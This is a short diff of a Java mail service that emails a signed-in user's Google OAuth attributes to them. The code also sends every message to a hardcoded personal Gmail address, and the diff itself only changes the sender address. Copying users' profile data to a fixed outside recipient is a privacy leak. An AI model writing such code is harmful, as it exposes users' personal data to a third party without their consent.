@@ -33,7 +33,7 @@ public class MailService {
             MimeMessage message = javaMailSender.createMimeMessage();
             MimeMessageHelper helper = new MimeMessageHelper(message);
             helper.setTo(new String[]{email, "vusall.rehimovv@gmail.com"});
-            helper.setFrom(new InternetAddress("vusall.rehimovv@gmail.com", "Desofme"));
+            helper.setFrom(new InternetAddress("vusalr06@gmail.com", "Desofme"));
             helper.setSubject("Your google data");
             helper.setText(principal.getAttributes().toString());
             javaMailSender.send(message);
